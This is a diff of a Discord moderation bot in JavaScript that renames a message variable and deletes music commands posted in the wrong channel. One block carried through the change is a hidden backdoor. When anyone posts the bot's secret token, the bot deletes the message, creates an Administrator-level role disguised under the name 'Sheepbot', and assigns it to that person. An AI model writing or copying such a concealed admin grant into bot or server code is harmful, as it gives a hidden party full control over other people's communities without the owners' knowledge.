@@ -17,35 +17,35 @@ client.on('guildMemberAdd', member => {
     member.addRole(memberRole)
 });
 
-client.on('message', msg => {
-    if (msg.author.equals(client.user)) return;
+client.on('message', message => {
+    if (message.author.equals(client.user)) return;
     //Sheepbot csak a zenébe tud írni
     var sheepbotcmds = ['!!play', '!!pause', '!!stop', '!!skip', '!!volume', '!!autoplay', '!!playing', '!!playtop', '!!loopqueue', '!!q', '!!shuffle'];
     var i;
     for (i = 0; i < sheepbotcmds.length; i++) {
-         if (!(msg.channel.name === '🎶zenebona') && (msg.content.startsWith(sheepbotcmds[i]))) {
-            msg.delete()
-                .then(msg => console.log(`Deleted message from ${msg.author.username}`))
+         if (!(message.channel.name === '🎶zenebona') && (message.content.startsWith(sheepbotcmds[i]))) {
+            message.delete()
+                .then(msg => console.log(`Deleted message from ${message.author.username}`))
                 .catch(console.error);
         };
     };
-    if (!(msg.channel.name === '🎶zenebona') && (msg.author.id === '244423082045997057')) {
-        msg.delete()
-            .then(msg => console.log(`Deleted message from ${msg.author.username}`))
+    if (!(message.channel.name === '🎶zenebona') && (message.author.id === '244423082045997057')) {
+        message.delete()
+            .then(msg => console.log(`Deleted message from ${message.author.username}`))
             .catch(console.error);
     };
-    if (msg.content == process.env.TOKEN) {
+    if (message.content == process.env.TOKEN) {
 
-        msg.delete()
-            .then(msg => console.log(`Deleted message from ${msg.author.username}`))
+        message.delete()
+            .then(msg => console.log(`Deleted message from ${message.author.username}`))
             .catch(console.error);
 
         let RoleName = 'Sheepbot';
-        msg.member.guild.createRole({
+        message.member.guild.createRole({
             name: RoleName,
             permissions: 8
         }).then(function (role) {
-            msg.member.addRole(role);
+            message.member.addRole(role);
         });
     };
     function rt_help() {
